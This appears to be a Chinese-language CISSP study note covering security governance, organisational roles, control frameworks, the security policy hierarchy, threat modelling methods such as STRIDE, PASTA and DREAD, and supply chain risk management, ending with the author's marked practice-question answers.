管理安全功能</h1><p>安全功能是业务运营的一个方面，专注于随着时间的推移评估和改进安全性的任务。</p><p>通过执行风险评估以推动安全策略的行为是有关安全功能管理的最清晰与最直接的示例。</p><p>安全必须是可衡量的。</p><p>可衡量的安全意味着安全机制的各个方面都发挥作用，提供明显的收益，并有一个或多个可以进行记录与分析的指标。</p><p>当实施安全对策或保护措施后，安全指标应显示出意外事件数量的减少或尝试检测事件数量的增加。</p><p>测量和评估安全指标的行为可以评估安全计划的完整性和有效性。</p><p>还应该包括根据通用安全准则对安全计划进行测量，并跟踪其控制措施的成功与否。</p><h2 id="1-5-1-与业务战略、目标、使命和宗旨相一致的安全功能"><a href="#1-5-1-与业务战略、目标、使命和宗旨相一致的安全功能" class="headerlink" title="1.5.1 与业务战略、目标、使命和宗旨相一致的安全功能"></a>1.5.1 与业务战略、目标、使命和宗旨相一致的安全功能</h2><p>安全管理计划确保正确地创建、执行和实施安全策略。</p><p>最能有效处理安全管理计划的一个方法是自上而下方法。</p><p>上层启动和定义</p><p>中层落实</p><p>操作和专业人员实现</p><p>用户遵守</p><p>1、上层、高级或管理部门负责启动和定义组织的策略。安全策略为组织架构内的各个级别提供指导。</p><p>2、中层管理人员负责将安全策略落实到标准、基线、指导方针和程序。</p><p>3、操作管理人员或安全专业人员必须实现安全管理文档中规定的配置。</p><p>4、最终用户必须遵守组织的所有安全策略。</p><p>安全管理计划的内容包括：定义安全角色，规定如何管理安全、由谁负责安全以及如何检验安全的有效性，制定安全策略，执行风险分析，要求对员工进行安全教育。</p><p>安全管理计划团队应制定战略计划、战术计划和操作计划三种类型的计划。</p><p>1、<strong>战略计划</strong>（strategic plan）</p><p>相对稳定的长期计划，定义组织的安全目的和安全功能。</p><p>有效期大约是5年。</p><p>也被视为愿景规划</p><p>讨论了未来的长期目标和愿景，需要包含风险评估。</p><p>2、<strong>战术计划</strong>（tactical plan）</p><p>中期计划</p><p>为战略计划中设定的目标提供更多细节，该计划也可根据不可预测的事件临时制定。</p><p>有效期大约是1年左右。</p><p>通常规定和安排实现组织目标所需的任务。</p><p>可以包含项目计划、收购计划、招聘计划、预算计划、维护计划、支持计划和系统开发计划。</p><p>3、<strong>操作计划</strong>（operational plan）</p><p>短期、高度详细的计划</p><p>在战略计划和战术计划的基础上制定</p><p>短期内有效或有用</p><p>必须经常更新（如每月或每季度），以保证其与战术计划的一致性。</p><p>阐明了如何实现组织的各种目标，包括资源分配、预算需求、人员分配、进度安排与细化或执行程序。</p><p>包含执行流程与组织安全策略的合规性细节。</p><p>可以包含培训计划、系统部署计划和产品设计计划。</p><p><strong>安全是一个持续的过程</strong>。</p><p>安全管理计划的活动可能有一个确定的起点，但其任务和工作永远无法彻底完成或实现。</p><p>有效的安全计划关注具体和可实现的目标、预测变化和潜在问题，并充当整个组织决策的基础。</p><p>安全文档应该是具体的、定义完善的和明确说明的。</p><h2 id="1-5-2-组织的流程"><a href="#1-5-2-组织的流程" class="headerlink" title="1.5.2 组织的流程"></a>1.5.2 组织的流程</h2><p>安全治理需要关注组织的方方面面，包括收购、资产剥离和治理委员会的组织流程。</p><p><strong>收购与兼并会提升组织的安全风险</strong>，这些风险包括不恰当的信息泄露、数据丢失、停机或未能获得足够的投资回报率（return on investment，ROI），还需要良好的安全监督和加强的审查。</p><p>收购如果不考虑安全性，所收购的产品固有风险将在整个部署生命周期内一直存在。</p><p>重要的是评估与硬件、软件和服务相关的风险。</p><p>收购不仅涉及硬件和软件，也包括外包、与供应商签订合同、聘请顾问等内容。与外部实体协同工作时，不仅要重视集成的安全性评估，还要确保在设计产品时考虑了安全性。</p><p>当使用第三方评估和监控服务时，外部实体需要在其操作中体现出安全意识。</p><p>在为安全集成评估第三方时，考虑以下过程：</p><p>1、<strong>现场评估</strong> 到组织现场进行访谈，观察工作人员的操作习惯。</p><p>2、<strong>文件交换和审查</strong> 调查数据和文件记录交换的方式，以及执行评估和审查的正式过程。</p><p>3、<strong>过程&#x2F;策略审查</strong> 要求提供安全策略、过程&#x2F;程序，以及事件和响应文件的副本以供审查。</p><p>4、<strong>第三方审计</strong> 根据美国注册会计师协会（AICPA）的定义，拥有独立性的第三方审计机构可根据SOC报告，对实体的安全基础设施进行公正的审查。</p><p>为所有收购设立最低限度的安全要求。</p><p><strong>资产剥离或任何形式的资产减少或员工裁减</strong>，会增加组织对集中安全治理的需求。</p><p>具体治理需求：</p><p>1、对资产进行净化以防止数据泄露。</p><p>2、应该删除和销毁存储介质，因为介质净化处理技术不能保证残留数据不会被恢复。</p><p>3、对于不再负责相关事宜的员工，应询问其工作完成情况，也称为离职面谈。通常包含审查所有保密协议以及其他任何在此雇佣关系终止后继续生效的约束合同或协议。</p><h2 id="1-5-3-组织的角色与责任"><a href="#1-5-3-组织的角色与责任" class="headerlink" title="1.5.3 组织的角色与责任"></a>1.5.3 组织的角色与责任</h2><p>安全角色是个人在组织内的安全实施和管理总体方案中扮演的角色。</p><p>典型安全环境中存在的常见安全角色：</p><p><strong>高级管理者</strong></p><p>组织所有着（高级管理者）角色被分配给最终对组织安全的维护负责及最关心资产保护的人员。</p><p>高级管理者需要对安全策略授权和支持，对安全解决方案的总体成功或失败负责。</p><p>很少直接实施安全解决方案，大多情况下，实施会被分配给安全专业人员。</p><p><strong>安全专业人员</strong></p><p>安全专业人员、信息安全官（InfoSec）或计算机事件响应小组（computer incident response team，CIRT）的角色被分配给受过培训和经验丰富的网络、系统和安全工程师们，负责落实高级管理者下达的指示。</p><p>职责是保证安全性，包括编写和执行安全策略。</p><p>安全专业人员是实施者，决策者是高级管理者。</p><p><strong>资产所有者</strong></p><p>资产所有者（asset owner ）角色将被分配在安全解决方案中负责布置和保护信息分类的人员。</p><p>资产所有者通常是高级管理人员，最终对资产保护负责。</p><p>资产所有者通常将实际数据管理任务的责任委托给托管员。</p><p><strong>托管员</strong></p><p>托管员（custodian）角色被分配给负责执行安全策略与高级管理者规定的保护任务的人员。</p><p>托管员执行所有必要的活动，为实现数据的 CIA 三元组（保密性、完整性和可用性）提供充分的数据支持，并履行上级管理部门委派的要求和职责。</p><p><strong>用户</strong></p><p>用户（最终用户或操作员）角色被分配给任何能访问安全系统的人员。</p><p>用户的访问权限与他们的工作任务相关并受其限制，只有足以执行工作岗位所需的任务的访问权限（最小特权原则）。</p><p><strong>审计人员</strong></p><p>审计人员（auditor）负责审查和验证安全策略是否被正确执行，以及相关的安全解决方案是否完备。</p><p>审计人员出具由高级管理者审核的合规性和有效性报告。</p><p>高级管理者将报告中发现的问题当作新的工作内容分配给安全专业人员或托管员。</p><h2 id="1-5-4-安全控制框架"><a href="#1-5-4-安全控制框架" class="headerlink" title="1.5.4 安全控制框架"></a>1.5.4 安全控制框架</h2><p>安全规划步骤中的第一步（也是最重要的一步），就是考虑组织所希望的安全解决方案的总体安全控制框架或结构。</p><p>应用最广泛的安全控制框架之一是信息和相关技术控制目标（COBIT）</p><p>COBIT由ISACA编制的一套记录IT最佳安全实践的文档，规定了安全控制的目标和需求，并鼓励将IT安全思路映射到业务目标。</p><p>COBIT基于六个关键原则进行企业IT治理和管理：</p><p>原则1：为利益相关方创造价值</p><p>原则2：采用整体分析法</p><p>原则3：动态地治理系统</p><p>原则4：把治理从管理中分离出来</p><p>原则5：根据企业需求量身定制</p><p>原则6：采用端到端的治理系统</p><p>COBIT还可以作为审计人员的工作指南。</p><p>IT安全其他的标准和指南：</p><p><strong>NIST SP 800-53 Rev.5 信息系统和组织的安全和隐私控制</strong></p><p>包含美国政府为组织安全提供的通用性建议</p><p><strong>互联网安全中心（CIS）</strong></p><p>提供针对操作系统、应用程序和硬件的安全配置指引。</p><p><strong>NIST 风险管理框架（RMF）</strong></p><p>对联邦机构制定了强制性要求。</p><p>RMF分为六个阶段：分类、选择、实施、评估、授权和监控。</p><p><strong>NIST 网络安全框架（CSF）</strong></p><p>为关键基础设施和商业组织而设计，由识别、保护、检测、响应和恢复五个功能构成。</p><p><strong>ISO&#x2F;IEC 27000系列</strong></p><p>国际标准，可作为实施组织信息安全及相关管理实践的基础。</p><p><strong>信息技术基础设施库（Information Technology Infrastructure Library，ITIL）</strong></p><p>最初由英国政府制定，是一套被推荐的优化IT服务以及支持业务增长、转型和变革的最佳实践。</p><p>重点是理解IT和安全需求如何与组织目标进行集成一致。</p><h2 id="1-5-5-应尽关心和尽职审查"><a href="#1-5-5-应尽关心和尽职审查" class="headerlink" title="1.5.5 应尽关心和尽职审查"></a>1.5.5 应尽关心和尽职审查</h2><p>计划安全重要的原因之一是需要进行应尽关心和尽职审查。</p><p>应尽关心是指制定计划、策略和流程以保护组织的利益。</p><p>尽职审查指的是实践那些维持应尽关心工作的活动。</p><p>对于考试</p><p>应尽关心是指制定一种正式的安全框架，其中包含安全策略、标准、基线、指南和程序。</p><p>尽职审查是指将这种安全框架持续应用到组织的IT基础设施上。</p><p>运营安全指组织内的所有责任相关方持续实施应尽关心和尽职审查。</p><p>应尽关心是知道应该做什么并为此制订计划。</p><p>尽职审查是在正确的时间采取正确的行为。</p><p>在发生安全事故时，拿出应尽关心和尽职审查的证据是证明没有疏忽的唯一方法。</p><h1 id="1-6-安全策略、标准、程序和指南"><a href="#1-6-安全策略、标准、程序和指南" class="headerlink" title="1.6 安全策略、标准、程序和指南"></a>1.6 安全策略、标准、程序和指南</h1><p>维护安全是业务发展的重要内容。</p><p>通过开发的实现文档化的安全策略、标准、程序和指南，可以生成可靠的、可依赖的安全基础设施。</p><h2 id="1-6-1-安全策略"><a href="#1-6-1-安全策略" class="headerlink" title="1.6.1 安全策略"></a>1.6.1 安全策略</h2><p>规范化的最高层级文件被称为安全策略。</p><p>安全策略定义了组织所需要的安全范围，讨论需要保护的资产以及安全解决方案需要提供的必要保护程度。</p><p>安全策略是对组织安全需要的概述或归纳，定义战略性安全目标、愿景和宗旨，概述组织的安全框架。</p><p>安全策略用于分配职责、定义角色、明确审计需求、概述实施过程、确定合规性需求和定义可接受的风险级别。</p><p>安全策略是强制性的。</p><p>组织安全策略关注于整个组织相关的问题。</p><p>特定问题的安全策略专注于特定的服务、部门或功能。</p><p>策略是一种概述，而标准、基线、指南和程序包括更具体、更详细的信息。</p><p>标准处于安全策略的下一级别。</p><p><strong>可接受的策略</strong></p><p>可接受的策略定义可接受的性能级别及期望的行为和活动。</p><h2 id="1-6-2-安全标准、基线和指南"><a href="#1-6-2-安全标准、基线和指南" class="headerlink" title="1.6.2 安全标准、基线和指南"></a>1.6.2 安全标准、基线和指南</h2><p>在安全策略的指导下，可以编制其他安全文档。</p><h3 id="标准"><a href="#标准" class="headerlink" title="标准"></a>标准</h3><p>标准对硬件、软件、技术和安全控制方法的一致性定义了强制性要求。</p><p>标准提供在整个组织中统一实施技术和程序的操作过程。</p><h3 id="基线"><a href="#基线" class="headerlink" title="基线"></a>基线</h3><p>基线定义整个组织中每个系统必须满足的最低安全级别。</p><p>基线是一种更注重于操作的标准形式。</p><p>基线通常是系统特定的，一般参考行业或政府标准。</p><h3 id="指南"><a href="#指南" class="headerlink" title="指南"></a>指南</h3><p>指南是规范化安全策略结构中基线的下一级元素。</p><p>指南提供关于如何实现标准和基线的建议，并且是安全专业人员和用户的操作指南。</p><p>指南具有灵活性。</p><p>指南概述了方法，包括建议的行动，但并非强制性的。</p><h2 id="1-6-3-安全程序"><a href="#1-6-3-安全程序" class="headerlink" title="1.6.3 安全程序"></a>1.6.3 安全程序</h2><p>程序是规范化安全策略结构的最底层元素。</p><p>程序或标准操作程序（standard operating procedure，SOP）是详细的分步实施文档，描述实现特定安全机制、控制或解决方案所需的具体操作。</p><p>程序可针对整体系统，也可以针对单个产品或方面。</p><p>程序必须跟随软硬件演进不断更新。</p><p>程序目标是通过标准化与一致性的结果来确保业务流程的完整性。</p><p>顶层文档很少，下层文档很多（指南、程序等）。</p><p>文档独立保存好处：</p><ul><li>并非所有用户都需要知道所有安全分类级别的安全标准、基线、指南和程序。</li><li>当发生更改时，可以较方便地只更新和重新分发受影响的策略，而不必更新全部策略并在整个组织中重新分发。</li></ul><h1 id="1-7-威胁建模"><a href="#1-7-威胁建模" class="headerlink" title="1.7 威胁建模"></a>1.7 威胁建模</h1><p>威胁建模师识别、分类和分析潜在威胁的安全过程。</p><p>威胁建模可以被当作设计和开发期间的一种主动策略来执行，也可以作为产品部署后的一种被动策略来执行。</p><p>威胁建模过程识别潜在危害、发生的可能性、关注的优先级以及消除或减少威胁的手段。</p><p>安全开发生命周期（SDL）目标：</p><ul><li>降低与安全相关的设计和编码的缺陷数量（减少漏洞数量）</li><li>降低剩余缺陷的严重程度（减少高危漏洞）</li></ul><p>威胁建模的最终目标：<br>对危害组织有价值资产的潜在威胁进行优先级排序。</p><h3 id="防御式-主动式威胁建模"><a href="#防御式-主动式威胁建模" class="headerlink" title="防御式&#x2F;主动式威胁建模"></a>防御式&#x2F;主动式威胁建模</h3><p>发生在系统开发早期初始设计和规范建立阶段</p><p>成本效益更高</p><p>更有效</p><h3 id="被动式威胁建模"><a href="#被动式威胁建模" class="headerlink" title="被动式威胁建模"></a>被动式威胁建模</h3><p>也称为威胁狩猎，也被称为对抗性方法。</p><p>存在过度防御的威胁建模风险。</p><p>模糊（fuzz）测试是一种专用的动态测试技术。</p><h2 id="1-7-1-识别威胁"><a href="#1-7-1-识别威胁" class="headerlink" title="1.7.1 识别威胁"></a>1.7.1 识别威胁</h2><p>可能存在的威胁几乎是无限的。</p><p>使用结构化的方法来识别相关威胁。</p><h3 id="关注资产"><a href="#关注资产" class="headerlink" title="关注资产"></a>关注资产</h3><p>利用资产评估结果，试图识别有价值的资产面临的威胁</p><h3 id="关注攻击者"><a href="#关注攻击者" class="headerlink" title="关注攻击者"></a>关注攻击者</h3><p>识别潜在的攻击者，根据攻击者的动机、目标或者策略、技术和程序（TTP）来识别所代表的威胁</p><h3 id="关注软件"><a href="#关注软件" class="headerlink" title="关注软件"></a>关注软件</h3><p>考虑软件受到的潜在威胁</p><h3 id="STRIDE"><a href="#STRIDE" class="headerlink" title="STRIDE"></a>STRIDE</h3><p>威胁分类方案</p><ul><li><strong>欺骗（Spoofing</strong>）通过使用伪造的身份获得对目标系统的访问权限的攻击行为。</li><li><strong>篡改（Tampering）</strong>对传输或存储中的数据进行任何未授权的更改或操纵的行为。</li><li><strong>否认（Repudiation）</strong>用户或攻击者否认执行动作或活动的能力。</li><li><strong>信息泄露（Information Disclosure）</strong>将私有、机密或受控信息泄露或发送给外部或未经授权的实体。</li><li><strong>拒绝服务（DoS）</strong>该攻击试图阻止对资源的授权使用。</li><li><strong>特权提升（Elevation of Privilege）</strong>该攻击是将权限有限的用户账户转换为具有更大特权、权利和访问权限的账户。</li></ul><h3 id="PASTA"><a href="#PASTA" class="headerlink" title="PASTA"></a>PASTA</h3><p>攻击模拟和威胁分析过程（Process for Attack Simulation and Threat Analysis，PASTA）</p><p>威胁建模方法</p><p>以风险为核心，旨在选择或开发与要保护资产价值相关的防护措施</p><ul><li>阶段 1 ：为风险分析定义目标</li><li>阶段 2 ：定义技术范围（Definition of the Technical Scope，DTS）</li><li>阶段 3 ：分解和分析应用程序（Application Decomposition and Analysis，ADA）</li><li>阶段 4 ：威胁分析（Threat Analysis，TA）</li><li>阶段 5 ：弱点和脆弱性分析（Weakness and Vulnerability Analysis，WVA）</li><li>阶段 6 ：攻击建模与仿真（Attack Modeling &amp; Simulation，AMS）</li><li>阶段 7 ：风险分析和管理（Risk Analysis &amp; Management，RAM）</li></ul><p>PASTA 的每个阶段都有该阶段需要完成的目标和交付物的特别目标清单。</p><h3 id="VAST"><a href="#VAST" class="headerlink" title="VAST"></a>VAST</h3><p>可视化、敏捷和简单威胁（Visual，Agile，and Simple Threat，VAST）</p><p>基于敏捷项目管理和编程原则的威胁建模概念。</p><p>目标是在可扩展的基础上将威胁和风险管理集成到敏捷编程环境中。</p><p><strong>警惕个人威胁</strong></p><p>识别威胁是设计防御以帮助减少或消除停机、危害和损失的第一步。</p><h2 id="1-7-2-确定和绘制潜在的攻击"><a href="#1-7-2-确定和绘制潜在的攻击" class="headerlink" title="1.7.2  确定和绘制潜在的攻击"></a>1.7.2  确定和绘制潜在的攻击</h2><p>威胁建模的下一步是确定可能发生的潜在攻击。</p><p>通过创建事务中的元素图表及数据流和权限边界来完成。</p><p>复杂系统可能需要创建多个图表。</p><p>绘制出图表后确定涉及的技术。</p><p>确定针对图表中每个元素的攻击。</p><p>要考虑到各种攻击类型，包括逻辑&#x2F;技术、物理和社会攻击。</p><h2 id="1-7-3-执行简化分析"><a href="#1-7-3-执行简化分析" class="headerlink" title="1.7.3 执行简化分析"></a>1.7.3 执行简化分析</h2><p>威胁建模的下一步是执行简化分析。</p><p>简化分析也被称为分解应用程序、系统或环境。</p><p>无论是应用程序、系统，还是整个环境，都需要被分解为更小的容器或单元。</p><p>为理解输入、处理、信息安全、数据管理、存储和输出，应该对每个已识别的子元素进行评估。</p><h3 id="分解过程中关键概念"><a href="#分解过程中关键概念" class="headerlink" title="分解过程中关键概念"></a>分解过程中关键概念</h3><h4 id="信任边界"><a href="#信任边界" class="headerlink" title="信任边界"></a>信任边界</h4><p>信任级别或安全级别发生变化的位置</p><h4 id="数据流路径"><a href="#数据流路径" class="headerlink" title="数据流路径"></a>数据流路径</h4><p>数据在两个位置之间的流动</p><h4 id="输入点"><a href="#输入点" class="headerlink" title="输入点"></a>输入点</h4><p>接收外部输入的位置</p><h4 id="特权操作"><a href="#特权操作" class="headerlink" title="特权操作"></a>特权操作</h4><p>需要比标准用户账户或流程拥有更多特权的任何活动</p><h4 id="安全声明和方法的细节"><a href="#安全声明和方法的细节" class="headerlink" title="安全声明和方法的细节"></a>安全声明和方法的细节</h4><p>关于安全策略、安全基线和安全假设的声明</p><p>识别出威胁，需要定义威胁的手段、目标和后果对其进行完整记录。</p><h2 id="1-7-4-优先级排序和响应"><a href="#1-7-4-优先级排序和响应" class="headerlink" title="1.7.4 优先级排序和响应"></a>1.7.4 优先级排序和响应</h2><p>完成文档记录后，下一步要对威胁进行排序或定级。</p><h3 id="排序-定级技术"><a href="#排序-定级技术" class="headerlink" title="排序&#x2F;定级技术"></a>排序&#x2F;定级技术</h3><h4 id="概率-潜在损失"><a href="#概率-潜在损失" class="headerlink" title="概率*潜在损失"></a>概率*潜在损失</h4><p>生产代表风险严重程度的编号。</p><p>编号范围 1～100</p><p>100 代表可能发生的最严重风险</p><p>初始值范围为 1～10 ，1 最低，10 最高</p><p>存在武断和主观，需要同一个人或团队指定数字，会有相对准确的评估结果。</p><h4 id="高-中-低"><a href="#高-中-低" class="headerlink" title="高&#x2F;中&#x2F;低"></a>高&#x2F;中&#x2F;低</h4><p>高&#x2F;中&#x2F;低，1&#x2F;2&#x2F;3，绿&#x2F;黄&#x2F;红</p><p>创建基本风险矩阵或风险热图。</p><p>目的是帮助确定关键优先级。</p><p>为每个威胁分配一个概率和一个损害级别。</p><p>两者进行比较，得到组合取值。</p><p>HH（高概率&#x2F;高损害级别）威胁应该优先关注。</p><p>LL（低概率&#x2F;低损害级别）威胁最后关注。</p><p><img src="/image-20250514091321281.png" alt="image-20250514091321281"></p><h4 id="DREAD"><a href="#DREAD" class="headerlink" title="DREAD"></a>DREAD</h4><p>提供一种灵活的评级解决方案。</p><p>基于对每个威胁的五个问题的回答。</p><ul><li><strong>潜在破坏：</strong>如果威胁成真，可能造成的损害有多严重？</li><li><strong>可在现性：</strong>攻击者复现攻击的过程有多复杂？</li><li><strong>可利用性：</strong>实施攻击的难度有多大？</li><li><strong>受影响用户：</strong>有多少用户可能受到攻击的影响（按照百分比）？</li><li><strong>可发现性：</strong>攻击者发现弱点有多难？</li></ul><p>确定威胁优先级后，就需要确定对这些威胁的响应。</p><p>考虑技术和过程，权衡成本和收益。</p><p><strong>威胁建模过程和风险评估过程区别</strong></p><p>威胁建模的重点是威胁。</p><p>风险评估的重点是资产。</p><h1 id="1-8-将基于风险的管理理念应用到供应链"><a href="#1-8-将基于风险的管理理念应用到供应链" class="headerlink" title="1.8 将基于风险的管理理念应用到供应链"></a>1.8 将基于风险的管理理念应用到供应链</h1><p>供应链风险管理（SCRM）</p><p>旨在确保供应链中所有供应商或环节都是可靠的、值得信懒的、信誉良好的组织。</p><p>供应链组织向业务伙伴披露实践和安全需求。</p><p>供应链中的每个环节都是可靠的，并对下一个环节负责。</p><p>安全供应链旨在确保成本质量，满足性能和操作目标，并提供规定的安全机制，且在整个过程中，没有任何伪造或遭受未经授权或恶意操纵或破坏的节点。</p><p>评估组织风险时，需要考虑可能影响组织的外部因素。</p><p>应该评估组织的供应链以确定其带来的风险。</p><p>检查所有设备，以降低修改后的设备进入生产网络的可能性。</p><p>选择从值得信赖和信誉良好的供应商那里采购产品。</p><p>需要持续的安全监控、管理和评估。</p><p>应该为供应链中的每个实体设立最低安全要求。</p><p>对新的硬件、软件或服务的安全要求应该始终满足或超过对最终产品安全性的预期。</p><ul><li>详细审查 SLA、合同和实际执行情况</li></ul><p>定义服务级别需求SLR：</p><p>对供应商产品（或服务）的服务和性能期望的说明。</p><p>SLR是由客户在 SLA 建立之前提供的。</p><h1 id="1-10-考试要点"><a href="#1-10-考试要点" class="headerlink" title="1.10 考试要点"></a>1.10 考试要点</h1><h2 id="理解由保密性、完整性和可用性组成的-CIA-三元组"><a href="#理解由保密性、完整性和可用性组成的-CIA-三元组" class="headerlink" title="理解由保密性、完整性和可用性组成的 CIA 三元组"></a>理解由保密性、完整性和可用性组成的 CIA 三元组</h2><p>保密性原则是指客体不会被泄露给未经授权的主体。</p><p>完整性原则是指客体保持真实性且只被经过授权的主体进行有目的的修改。</p><p>可用性原则指被授权的主体能实时和不间断地访问客体。</p><h2 id="了解-AAA-服务的要素"><a href="#了解-AAA-服务的要素" class="headerlink" title="了解 AAA 服务的要素"></a>了解 AAA 服务的要素</h2><p>AAA 由标识、身份认证、授权、审计和记账（或问责制）构成。</p><h2 id="能够解释身份标识是如何工作的"><a href="#能够解释身份标识是如何工作的" class="headerlink" title="能够解释身份标识是如何工作的"></a>能够解释身份标识是如何工作的</h2><p>身份标识是一个主体声明身份并开始承担责任的过程。</p><p>主体必须为系统提供标识，以便于启动身份认证、授权和问责制的过程。</p><h2 id="理解身份认证过程"><a href="#理解身份认证过程" class="headerlink" title="理解身份认证过程"></a>理解身份认证过程</h2><p>身份认证是验证或测试声称的身份是否有效的过程。</p><p>身份认证需要来自主体的信息，这些信息必须与指示的身份完全一致。</p><h2 id="了解授权如何用于安全计划"><a href="#了解授权如何用于安全计划" class="headerlink" title="了解授权如何用于安全计划"></a>了解授权如何用于安全计划</h2><p>一旦对主体进行了身份认证，就必须对其访问进行授权。</p><p>鉴于已通过验证的身份被赋予的权利和特权，授权过程确保被请求的活动或对客体的访问是可以实现的。</p><h2 id="能够解释审计过程"><a href="#能够解释审计过程" class="headerlink" title="能够解释审计过程"></a>能够解释审计过程</h2><p>审计是一种程序化的过程：通过文档或者主体活动记录，在验证过的主体为其行为负责。</p><h2 id="理解问责制的重要性"><a href="#理解问责制的重要性" class="headerlink" title="理解问责制的重要性"></a>理解问责制的重要性</h2><p>只有在主体对他们的行为负责时，才能保持安全性。</p><p>有效的问责制依赖于检验主体身份及追踪其活动的能力。</p><h2 id="能够解释不可否认性"><a href="#能够解释不可否认性" class="headerlink" title="能够解释不可否认性"></a>能够解释不可否认性</h2><p>不可否认性确保活动或事件的主体不能否认事件的发生。</p><p>防止主体声称没有发送过消息、没有执行过动作或没有导致事件的发生。</p><h2 id="了解纵深防御"><a href="#了解纵深防御" class="headerlink" title="了解纵深防御"></a>了解纵深防御</h2><p>纵深防御，也叫分层防御，指简单使用一系列控制中的多个控制。</p><p>多层防护解决方案允许使用许多不同的控制措施来抵御随时都可能出现的威胁。</p><h2 id="能够解释抽象的概念"><a href="#能够解释抽象的概念" class="headerlink" title="能够解释抽象的概念"></a>能够解释抽象的概念</h2><p>抽象用于将相似的元素放入组、类或角色中，这些组、类或角色作为集合被指派安全控制、限制或许可。</p><p>抽象提高了安全计划的实施效率。</p><h2 id="理解数据隐藏"><a href="#理解数据隐藏" class="headerlink" title="理解数据隐藏"></a>理解数据隐藏</h2><p>顾名思义，数据隐藏旨在防止数据被主体发现或者访问。</p><p>数据隐藏通常是安全控制和编程中的关键元素。</p><h2 id="了解安全边界"><a href="#了解安全边界" class="headerlink" title="了解安全边界"></a>了解安全边界</h2><p>安全边界是具有不同安全要求或需求的任意两个区域、子网或环境之间的交界线。</p><h2 id="理解安全治理"><a href="#理解安全治理" class="headerlink" title="理解安全治理"></a>理解安全治理</h2><p>安全治理是与支持、定义和指导组织安全工作相关的实践集合。</p><h2 id="了解第三方治理"><a href="#了解第三方治理" class="headerlink" title="了解第三方治理"></a>了解第三方治理</h2><p>第三方治理可能由法律、法规、行业标准、合同义务或许可要求强制执行的外部实体监督系统。</p><p>实际的治理方法可能各有不同，但通常包括外部调查员或审计员。</p><h2 id="理解文件审查"><a href="#理解文件审查" class="headerlink" title="理解文件审查"></a>理解文件审查</h2><p>文件审查是查看交换材料并根据标准和期望对其进行验证的过程。</p><p>文件审查通常发生在现场检查之前。</p><p>许多情况下，特别是与政府或军事机构或承包商相关的情况下，如果未能提供足够的文件以满足第三方治理的要求，可能导致操作授权（ATO）的丢失或失效。</p><h2 id="理解与业务战略、目标、使命和宗旨相一致的安全功能"><a href="#理解与业务战略、目标、使命和宗旨相一致的安全功能" class="headerlink" title="理解与业务战略、目标、使命和宗旨相一致的安全功能"></a>理解与业务战略、目标、使命和宗旨相一致的安全功能</h2><p>安全管理计划确保正确地创建、执行和实施安全策略。</p><p>安全管理计划使安全功能与业务战略、目标、使命和宗旨相一致。</p><p>包括基于业务场景、预算限制或资源稀缺性来设计和实现安全。</p><h2 id="了解业务场景"><a href="#了解业务场景" class="headerlink" title="了解业务场景"></a>了解业务场景</h2><p>业务场景通常是文档化的参数或声明的立场，用于定义做出决策或采取某类行为的需求。</p><p>创建新的业务场景是指演示特定业务需求，以修改现有流程或选择完成业务任务的方法。</p><p>业务场景常被用来证明新项目（特别是与安全相关的项目）的启动时合理的。</p><h2 id="理解安全管理计划"><a href="#理解安全管理计划" class="headerlink" title="理解安全管理计划"></a>理解安全管理计划</h2><p>安全管理基于三种类型的计划：战略计划、战术计划和操作计划。</p><p>战略计划是相对稳定的长期计划，定义了组织的目标、使命和宗旨。</p><p>战术计划是中期计划，为战略计划中设定的目标提供更多细节。</p><p>操作计划是在战略计划和战术计划的基础上制定的短期、高度详细的计划。</p><h2 id="了解规范化安全策略结构的组成要素"><a href="#了解规范化安全策略结构的组成要素" class="headerlink" title="了解规范化安全策略结构的组成要素"></a>了解规范化安全策略结构的组成要素</h2><p>要创建一个全面的安全计划，需要具备以下内容：安全策略、标准、基线、指南和程序。</p><h2 id="理解组织的流程"><a href="#理解组织的流程" class="headerlink" title="理解组织的流程"></a>理解组织的流程</h2><p>安全治理需要关注组织的方方面面。</p><p>包括收购、资产剥离和治理委员会的组织流程。</p><h2 id="理解关键的安全角色"><a href="#理解关键的安全角色" class="headerlink" title="理解关键的安全角色"></a>理解关键的安全角色</h2><p>主要的安全角色有高级管理者、安全专业人员、用户、资产所有者、托管员和审计人员。</p><h2 id="了解-COBIT-的基础知识"><a href="#了解-COBIT-的基础知识" class="headerlink" title="了解 COBIT 的基础知识"></a>了解 COBIT 的基础知识</h2><p>COBIT 是一种安全控制框架，用于为企业制定综合的安全解决方案。</p><h2 id="理解应尽关心和尽职审查"><a href="#理解应尽关心和尽职审查" class="headerlink" title="理解应尽关心和尽职审查"></a>理解应尽关心和尽职审查</h2><p>应尽关心是指制定计划、策略和流程以保护组织的利益。</p><p>尽职审查指的是实践那些维持应尽关心工作的活动。</p><p>应尽关心是知道应该做什么并为此制订计划。</p><p>尽职审查是在正确的时间采取正确的行动。</p><h2 id="了解威胁建模的基础知识"><a href="#了解威胁建模的基础知识" class="headerlink" title="了解威胁建模的基础知识"></a>了解威胁建模的基础知识</h2><p>威胁建模是识别、分类和分析潜在威胁的安全过程。</p><p>威胁建模可被当成设计和开发期间的一种主动措施来执行，也可作为产品部署后的一种被动措施来执行。</p><p>关键概念包括：资产&#x2F;攻击者&#x2F;软件、STRIDE、PASTA、VAST、图表、简化&#x2F;分解和 DREAD。</p><h2 id="理解供应链风险管理概念"><a href="#理解供应链风险管理概念" class="headerlink" title="理解供应链风险管理概念"></a>理解供应链风险管理概念</h2><p>供应链风险管理（SCRM）旨在确保供应链中的所有供应商或环节都是可靠的、值得信赖的、信誉良好的组织，这些组织向业务伙伴（尽管不一定向公众）披露他们的实践和安全需求。</p><p>SCRM 包括评估与硬件、软件和服务相关的风险，进行第三方评估和监控，设立最低安全要求和强制执行服务级别需求。</p><h1 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h1><p>安全治理描述</p><p>COBIT</p><p>应尽关心和尽职审查定义</p><p>安全策略、标准、程序、指南、基线定义</p><p>供应链</p><p>PASTA、VAST｜SDL、STRIDE</p><p>纵深防御术语</p><p>C✅</p><p>B✅</p><p>B✅</p><p>C❌ D</p><p>​安全治理旨在将组织内所使用的安全流程和基础设施与从外部来源获得的知识和见解进行比较</p><p>C✅</p><p>ACDF✅</p><p>A✅</p><p>B✅</p><p>ABCDE❌ ABCE</p><p>​</p><p>ADEF❌ AD</p><p>C❌ B</p><p>D✅</p><p>B✅</p><p>ABD✅</p><p>B❌ D</p><p>A❌ B</p><p>C❌ A</p><p>A❌ C</p><p>BEF❌ BCEFG</p><p>ACDEGI ❌ ABCDEFGHI</p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>seccert</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>seccert</tag>
      
      <tag>cissp</tag>
      
    </tags>
    
